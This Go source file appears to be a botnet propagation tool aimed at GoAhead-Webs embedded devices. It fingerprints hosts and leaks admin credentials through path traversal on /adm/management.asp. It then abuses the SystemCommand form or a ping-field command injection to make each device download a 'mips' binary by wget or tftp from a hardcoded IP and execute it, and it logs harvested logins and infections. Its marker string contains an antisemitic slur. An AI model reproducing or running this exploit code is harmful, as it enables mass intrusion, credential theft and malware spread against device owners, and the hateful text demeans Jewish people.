package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

/*
	"Server: GoAhead-Webs" WWW-Authenticate: Basic
*/

var (
	port = os.Args[1]

	wg sync.WaitGroup

	timeout = 10 * time.Second

	processed uint64
	found     uint64
	credLeaks uint64
	exploited uint64

	binServer = "194.169.175.43"

	executeMessage = " fuck jews yuno on top"

	payloadPing = "cd+%2Ftmp%3Brm+-rf+mips%3Bwget+http%3A%2F%2F" + binServer + "%2F%2Fmips%3B+chmod+777+mips%3B+.%2Fmips+cnr"

	payloadCmdWget = "cd+%2Ftmp%3Brm+-rf+mips%3Bwget+http%3A%2F%2F" + binServer + "%2F%2Fmips%3B+chmod+777+mips%3B+.%2Fmips+cnr"
	payloadCmdTftp = "cd+%2Ftmp%3B+rm+-rf+mips%3B+tftp+-g+-r+mips+" + binServer + "+69%3B+chmod+777+mips%3B.%2Fmips+cnr"

	payloadCmdProtShellWget = "ping%3B+cd+%2Ftmp%3B+rm+-rf+mips%3B+wget+http%3A%2F%2F" + binServer + "%2F%2Fmips%3B+chmod+777+mips%3B+.%2Fmips+cnr"
	payloadCmdProtShellTftp = "ping%3B+cd+%2Ftmp%3B+rm+-rf+mips%3B+tftp+-g+-r+mips+" + binServer + "+69%3B+chmod+777+mips%3B.%2Fmips+cnr"
)

func findDevice(target string) bool {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), "Server: GoAhead-Webs")
}

func getAuthLeak2(target string) string {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return ""
	}

	conn.SetReadDeadline(time.Now().Add(timeout))

	conn.Write([]byte("GET /\\.gif\\..\\adm\\management.asp HTTP/1.1\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n\r\n"))

	var bytes bytes.Buffer
	_, err = io.Copy(&bytes, conn)
	nextbuf := strings.Split(bytes.String(), "var passadm = \"")

	if len(nextbuf) > 1 {
		password := strings.Split(nextbuf[1], "\";")
		return password[0]
	}

	nextbuf = strings.Split(bytes.String(), "<td><input type=\"password\" name=\"admpass\" size=\"20\" maxlength=\"32\" value=\"")

	if len(nextbuf) > 1 {
		password := strings.Split(nextbuf[1], "\"")
		return password[0]
	}

	return ""
}

func getAuthLeak(target string) (string, string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return "", ""
	}

	defer conn.Close()

	conn.Write([]byte("GET /\\..\\adm\\management.asp HTTP/1.1\r\nHost: " + target + "\r\nOrigin: http://" + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	var user, pass string

	if strings.Contains(buff.String(), "<td><input type=\"text\" name=\"admuser\" size=\"16\" maxlength=\"16\" value=\"") {
		usernameStr := strings.Split(buff.String(), "<td><input type=\"text\" name=\"admuser\" size=\"16\" maxlength=\"16\" value=\"")

		if len(usernameStr) > 1 {
			username := strings.Split(usernameStr[1], "\"")

			if len(username) > 0 {
				user = username[0]
			}
		}
	}

	if strings.Contains(buff.String(), "<td><input type=\"password\" name=\"admpass\" size=\"16\" maxlength=\"32\" value=\"") {
		passwordStr := strings.Split(buff.String(), "<td><input type=\"password\" name=\"admpass\" size=\"16\" maxlength=\"32\" value=\"")

		if len(passwordStr) > 1 {
			password := strings.Split(passwordStr[1], "\"")

			if len(password) > 0 {
				pass = password[0]
			}
		}
	}

	return user, pass
}

func getResponse(target, auth, check string) bool {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /adm/system_command.asp HTTP/1.1\r\nHost: " + target + "\r\nReferer: http://" + target + "/adm/system_command.asp\r\nOrigin: http://" + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return strings.Contains(buff.String(), check)
}

func sendPayload(target, auth, payload string) {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "command=" + payload + "&SystemCommandSubmit=admin+apply"
	cntLen := strconv.Itoa(len(data))

	conn.Write([]byte("POST /goform/SystemCommand HTTP/1.1\r\nHost: " + target + "\r\nReferer: http://" + target + "/goform/SystemCommand\r\nOrigin: http://" + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: Hello World\r\nContent-Length: " + cntLen + "\r\n\r\n" + data))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func sendPayload2(target, auth string) {
	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return
	}

	defer conn.Close()

	data := "tool=0&pingCount=4&host=%24%28" + payloadPing + "%29&sumbit=OK"
	cntLen := len(data)

	conn.Write([]byte(fmt.Sprintf("POST /goform/sysTools HTTP/1.1\r\nAuthorization: Basic "+auth+"\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\nContent-Length: %d\r\n\r\n%s", cntLen, data)))

	var buff bytes.Buffer
	io.Copy(&buff, conn)
}

func isSystemCommand(target, auth string) bool {

	conn, err := net.DialTimeout("tcp", target, timeout)

	if err != nil {
		return false
	}

	defer conn.Close()

	conn.Write([]byte("GET /adm/system_command.asp HTTP/1.1\r\nHost: " + target + "\r\nOrigin: http://" + target + "\r\nAuthorization: Basic " + auth + "\r\nUser-Agent: Hello World\r\n\r\n"))

	var buff bytes.Buffer
	io.Copy(&buff, conn)

	return !strings.Contains(buff.String(), "Page Not Found")
}

func getAuthLeakAll(target string) (string, string) {

	username, password := getAuthLeak(target)

	if username != "" && password != "" {
		return username, password
	}

	username = "admin"

	password = getAuthLeak2(target)

	if username != "" && password != "" {
		return username, password
	}

	return "", ""
}

func exploitDevice(target string) {

	processed++

	wg.Add(1)
	defer wg.Done()

	if !findDevice(target) {
		return
	}

	found++

	username, password := getAuthLeakAll(target)

	if username == "" || password == "" {
		return
	}

	fmt.Printf("[GOFORM] found login: %s:%s for %s\n", username, password, target)
	credLeaks++

	auth := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))

	if isSystemCommand(target, auth) {

		sendPayload(target, auth, "/bin/busybox")

		if getResponse(target, auth, "not support command") {

			sendPayload(target, auth, "ping; /bin/busybox")

			if !getResponse(target, auth, "wget") {
				fmt.Printf("[GOFORM] %s sending protected shell tftp payload\n", target)
				sendPayload(target, auth, payloadCmdProtShellTftp)
			} else {
				fmt.Printf("[GOFORM] %s sending protected shell wget payload\n", target)
				sendPayload(target, auth, payloadCmdProtShellWget)
			}
		} else {

			sendPayload(target, auth, "/bin/busybox")

			if !getResponse(target, auth, "wget") {
				fmt.Printf("[GOFORM] %s sending tftp payload\n", target)
				sendPayload(target, auth, payloadCmdTftp)
			} else {
				fmt.Printf("[GOFORM] %s sending wget payload\n", target)
				sendPayload(target, auth, payloadCmdWget)
			}
		}

		if getResponse(target, auth, executeMessage) {
			fmt.Printf("[GOFORM] infected %s %s:%s\n", target, username, password)
		}
	} else {

		fmt.Printf("[GOFORM] %s sending wget ping injection payload\n", target)
		sendPayload2(target, auth)

		if getResponse(target, auth, executeMessage) {
			fmt.Printf("[GOFORM] infected %s %s:%s\n", target, username, password)
		}
	}
}

func titleWriter() {
	for {
		fmt.Printf("Processed: %d | Found: %d | Cred leaks: %d | Exploited: %d\n", processed, found, credLeaks, exploited)
		time.Sleep(1 * time.Second)
	}
}

func main() {

	scanner := bufio.NewScanner(os.Stdin)

	go titleWriter()

	for scanner.Scan() {

		if port == "manual" {
			go exploitDevice(scanner.Text())
		} else {
			go exploitDevice(scanner.Text() + ":" + port)
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
